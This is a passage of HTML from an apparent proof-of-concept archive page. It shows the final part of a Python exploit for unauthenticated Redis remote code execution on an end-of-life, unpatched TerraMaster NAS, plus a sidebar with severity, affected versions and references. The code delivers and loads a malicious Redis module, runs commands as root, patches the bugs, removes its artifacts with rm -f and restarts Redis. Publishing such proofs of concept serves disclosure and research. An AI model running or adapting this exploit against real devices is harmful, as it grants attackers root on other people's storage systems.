+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isfile</span><span class=p>(</span><span class=n>module_so</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>bail</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>module_so</span><span class=si>}</span><span class=s2> not found — run &#39;make&#39; in rce/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>module_so</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Loaded </span><span class=si>{</span><span class=n>module_so</span><span class=si>}</span><span class=s2> (</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=si>}</span><span class=s2> bytes)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- phase 1: exploit the RCE ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>module_path</span> <span class=o>=</span> <span class=n>deliver_module</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>host</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=n>lhost</span><span class=o>=</span><span class=n>args</span><span class=o>.</span><span class=n>lhost</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>redis_load_module</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>host</span><span class=p>,</span> <span class=n>module_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>whoami</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;id&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;uid=0&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>whoami</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>bail</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Not root: </span><span class=si>{</span><span class=n>whoami</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>good</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Root: </span><span class=si>{</span><span class=n>whoami</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- phase 2: patch both bugs ---</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>patch_redis</span><span class=p>(</span><span class=n>sock</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>patch_nfs</span><span class=p>(</span><span class=n>sock</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>SystemExit</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>raise</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Patch failed: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;rm -f </span><span class=si>{</span><span class=n>module_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>redis_cmd</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;MODULE&#34;</span><span class=p>,</span> <span class=s2>&#34;UNLOAD&#34;</span><span class=p>,</span> <span class=s2>&#34;system&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>pass</span>
+</span></span><span class=line><span class=cl>        <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- phase 3: cleanup exploit artifacts ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Removing exploit module from disk&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;rm -f </span><span class=si>{</span><span class=n>module_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>args</span><span class=o>.</span><span class=n>no_restart</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Scheduling Redis restart in 2s&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;nohup sh -c &#39;sleep 2; /etc/init.d/redis restart&#39; &gt;/dev/null 2&gt;&amp;1 &amp;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>good</span><span class=p>(</span><span class=s2>&#34;Redis will restart bound to 127.0.0.1 in ~2 seconds&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=s2>&#34;Skipped restart — run &#39;/etc/init.d/redis restart&#39; to apply Redis bind fix&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>redis_cmd</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;MODULE&#34;</span><span class=p>,</span> <span class=s2>&#34;UNLOAD&#34;</span><span class=p>,</span> <span class=s2>&#34;system&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>(</span><span class=ne>BrokenPipeError</span><span class=p>,</span> <span class=ne>OSError</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>good</span><span class=p>(</span><span class=s2>&#34;Both vulnerabilities patched&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div></div></div><nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800"><a href=/pocs/web/2026-05-17_apache-httpd-mod-http2-double-free/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in network</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Apache httpd mod_http2 Double-Free Pre-Auth RCE - CVE-2026-23918</span>
+</a><a href=/pocs/binary/2026-05-18_dirtydecrypt/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in network →</span>
+<span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">DirtyDecrypt / DirtyCBC — rxgk Page-Cache Write (Dirty Pipe Variant)</span></a></nav></div><aside class="hidden lg:order-2 lg:block"><div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40"><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">CVE</dt><dd class="mt-1 text-emerald-600 dark:text-emerald-400">N/A (vendor confirmed TOS4 is EOL; no fix planned)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/network/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">TerraMaster TOS3_A1.0 4.2.41, Redis 4.0.10</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">TOS3_A1.0 4.2.41 (RTD1296/AArch64); other builds likely affected if same init path</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-18</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-amber-600 dark:text-amber-400">unpatched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/rce/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
+<a href=/tags/unauthenticated/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
+<a href=/tags/redis/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Redis</a>
+<a href=/tags/terramaster/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#TerraMaster</a>
+<a href=/tags/nas/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#NAS</a>
+<a href=/tags/aarch64/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#AArch64</a>
+<a href=/tags/root/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#root</a>
+<a href=/tags/module-loading/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#module-loading</a>
+<a href=/tags/replication-abuse/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#replication-abuse</a>
+<a href=/tags/nfs/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#NFS</a>
+<a href=/tags/no_root_squash/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#no_root_squash</a>
+<a href=/tags/lpe/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#LPE</a>
+<a href=/tags/network/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#network</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/v12-security/pocs target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/v12-security/pocs</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://redis.io/commands/module-loadex/ target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://redis.io/commands/module-loadex/</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://redis.io/docs/management/replication/ target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://redis.io/docs/management/replication/</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-zinc-800"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-05-18_tossup-terramaster-redis-rce/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div></div></aside></article></main><footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800"><div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500"><p class=font-mono>PoC Archive — research artifacts for defensive and educational use only.</p><p class=font-mono>built with <a href=https://gohugo.io class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages</p></div></footer></body></html>
